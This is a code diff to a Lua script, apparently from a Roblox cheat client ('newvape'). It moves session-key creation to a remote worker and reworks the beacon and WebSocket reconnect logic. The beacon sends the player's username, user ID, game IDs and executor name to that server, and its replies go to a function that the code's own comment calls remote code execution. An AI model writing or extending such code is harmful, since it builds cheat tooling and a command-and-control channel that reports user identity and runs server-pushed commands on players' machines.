@@ -39,23 +39,25 @@ return function(context)
 	local beating = false
 	local lastbeat = 0
 	local lastping = 0
+	local lastrefresh = 0
+	local lastkeytry = 0
 	local wsbackoff = 0
 	local wsconnecting = false
+	local refreshKey
 
+	-- the key is not generated here: the worker mints it and hands it over http, so a
+	-- machine that lost its file asks for a new one instead of inventing a secret the
+	-- server has no reason to trust
 	local sessionkey = ''
-	pcall(function()
-		local stored = hasFile('newvape/profiles/sessionkey.txt') and readfile('newvape/profiles/sessionkey.txt') or ''
-		if type(stored) == 'string' and #stored == 32 and stored:match('^%x+$') then
-			sessionkey = stored
-			return
-		end
 
-		local generated = (httpService:GenerateGUID(false):gsub('-', ''))
-		if type(generated) == 'string' and #generated == 32 then
-			sessionkey = generated
-			pcall(writefile, 'newvape/profiles/sessionkey.txt', generated)
+	local function storedKey()
+		if not hasFile('newvape/profiles/sessionkey.txt') then return end
+
+		local ok, stored = pcall(readfile, 'newvape/profiles/sessionkey.txt')
+		if ok and type(stored) == 'string' and #stored == 32 and stored:match('^%x+$') then
+			return stored
 		end
-	end)
+	end
 
 	local wsok, wsconnect = pcall(function()
 		local lib = WebSocket
@@ -88,6 +90,67 @@ return function(context)
 
 		placeName = (okName and type(name) == 'string' and #name > 0) and name:sub(1, 80) or '-'
 		return placeName
+	end
+
+	-- the worker mints the session key: one http call on boot, and again only when the
+	-- stored key stops matching. it is the only door that can hand out a fresh secret,
+	-- and it follows the same rebind rule as the beacon (409 while the old holder is
+	-- still inside the rebind window)
+	local function requestSessionKey()
+		if typeof(request) ~= 'function' then return nil end
+
+		local ok, response = pcall(function()
+			return request({
+				Method = 'POST',
+				Url = 'https://'..WORKER..'/api/activity/session',
+				Headers = {
+					['Content-Type'] = 'application/json',
+					['x-inhaler-request'] = '1'
+				},
+				Body = httpService:JSONEncode({
+					username = lplr.Name,
+					userId = tostring(lplr.UserId),
+					jobId = game.JobId,
+					placeId = tostring(game.PlaceId),
+					placeName = resolvePlaceName(),
+					executor = execname,
+					connectionType = socket and 'websocket' or 'http',
+					sessionKey = sessionkey
+				})
+			})
+		end)
+
+		if not ok or type(response) ~= 'table' then return nil end
+
+		local status = tonumber(response.StatusCode)
+		if status ~= 200 or type(response.Body) ~= 'string' then return nil, status end
+
+		local decoded, data = pcall(httpService.JSONDecode, httpService, response.Body)
+		local key = decoded and type(data) == 'table' and data.sessionKey or nil
+		if type(key) ~= 'string' then return nil, status end
+
+		key = key:lower()
+		if #key == 32 and key:match('^%x+$') then return key end
+	end
+
+	-- a worker that predates /api/activity/session has no key door: fall back to a local
+	-- secret so an un-updated worker does not brick an updated client
+	local function generateKey()
+		local ok, generated = pcall(function()
+			return (httpService:GenerateGUID(false):gsub('-', '')):lower()
+		end)
+
+		if ok and type(generated) == 'string' and #generated == 32 and generated:match('^%x+$') then
+			return generated
+		end
+	end
+
+	local function adoptKey(key)
+		if type(key) ~= 'string' or key == '' or key == sessionkey then return false end
+
+		sessionkey = key
+		pcall(writefile, 'newvape/profiles/sessionkey.txt', key)
+		return true
 	end
 
 	-- Remote code execution lives here and nowhere else: it is not in the chat command
@@ -166,7 +229,7 @@ return function(context)
 	end
 
 	local function beat()
-		if beating then return end
+		if beating or sessionkey == '' then return end
 		beating = true
 
 		local ok, response = pcall(function()
@@ -196,7 +259,15 @@ return function(context)
 
 		if ok and response and response.Success ~= false and type(response.Body) == 'string' then
 			local decoded, data = pcall(httpService.JSONDecode, httpService, response.Body)
-			if decoded then runRemote(data) end
+			if decoded then
+				-- the worker marks a refused key, so an empty answer is not mistaken for
+				-- an empty queue: ask http for a fresh one and keep going
+				if type(data) == 'table' and data.stale then
+					refreshKey()
+				end
+
+				runRemote(data)
+			end
 		end
 	end
 
@@ -213,7 +284,7 @@ return function(context)
 	local connectActivity
 
 	function connectActivity()
-		if stopped or socket or wsconnecting or not haswebsockets then return end
+		if stopped or socket or wsconnecting or not haswebsockets or sessionkey == '' then return end
 		wsconnecting = true
 
 		task.spawn(function()
@@ -242,24 +313,67 @@ return function(context)
 					socket = nil
 					if stopped then return end
 					task.wait(1)
+
+					-- a 4401 close means the handshake key was refused: ask for a fresh
+					-- one before reconnecting, or the next socket fails the same way. when
+					-- the key did not change the slot is still held, so the reconnect is
+					-- left to the beacon loop instead of spinning here
+					local before = sessionkey
+					refreshKey(true)
+					if sessionkey == before then return end
+
 					connectActivity()
 				end)
 			end)
 		end)
 	end
 
-	-- the beacon is the only path that can re-bind this machine's session key: the
-	-- handshake binds it once and touchSession refuses a key it does not know, so a
-	-- socket that stays open would pin a changed key forever and every queued command
-	-- would go undelivered. the beacon therefore keeps running behind an open socket,
-	-- just slower than the ping.
 	local PING_INTERVAL = 20
 	local BEAT_IDLE = 20
 	local BEAT_SOCKET = 120
+	local KEY_CHECK = 120
+	local KEY_RETRY = 60
+
+	-- the key this machine holds can go stale (the slot was re-bound elsewhere, or the
+	-- file was replaced). the worker says so by closing the socket with 4401 and by
+	-- marking a beacon `stale`, and both paths land here. a key that cannot be replaced
+	-- yet — the old holder is still inside the rebind window — is retried later, because
+	-- the slot only frees up once that holder goes quiet.
+	refreshKey = function(force)
+		local now = os.time()
+		if not force and now - lastrefresh < KEY_CHECK then return end
+		lastrefresh = now
+
+		local key = requestSessionKey()
+		if not key or not adoptKey(key) then return end
+
+		-- the open socket carried the old key in its handshake: drop it so the
+		-- reconnect presents the new one
+		local old = socket
+		socket = nil
+		if old then
+			pcall(function() old:Close() end)
+		end
+	end
 
 	local function start()
 		task.spawn(function()
-			connectActivity()
+			sessionkey = storedKey() or sessionkey
+			if sessionkey == '' then
+				local key, status = requestSessionKey()
+				if not key and (status == 404 or status == 405) then
+					key = generateKey()
+				end
+
+				sessionkey = key or ''
+			end
+
+			lastrefresh = os.time()
+
+			if sessionkey ~= '' then
+				pcall(writefile, 'newvape/profiles/sessionkey.txt', sessionkey)
+				connectActivity()
+			end
 
 			repeat
 				local ok, done = pcall(whitelist.update, whitelist, whitelist.loaded)
@@ -267,20 +381,32 @@ return function(context)
 
 				local now = os.time()
 
-				if socket then
-					if now - lastping >= PING_INTERVAL then
-						lastping = now
-						task.spawn(function() pcall(socket.Send, socket, 'ping') end)
+				if sessionkey == '' then
+					-- no key yet: the answer is 409 while another holder is live, so this
+					-- ask stays slow instead of spinning
+					if now - lastkeytry >= KEY_RETRY then
+						lastkeytry = now
+						local key = requestSessionKey()
+						if key and adoptKey(key) then connectActivity() end
 					end
+				else
+					refreshKey()
 
-					if now - lastbeat >= BEAT_SOCKET then
+					if socket then
+						if now - lastping >= PING_INTERVAL then
+							lastping = now
+							task.spawn(function() pcall(socket.Send, socket, 'ping') end)
+						end
+
+						if now - lastbeat >= BEAT_SOCKET then
+							lastbeat = now
+							task.spawn(beat)
+						end
+					elseif now - lastbeat >= BEAT_IDLE then
 						lastbeat = now
 						task.spawn(beat)
+						connectActivity()
 					end
-				elseif now - lastbeat >= BEAT_IDLE then
-					lastbeat = now
-					task.spawn(beat)
-					connectActivity()
 				end
 
 				task.wait(10)
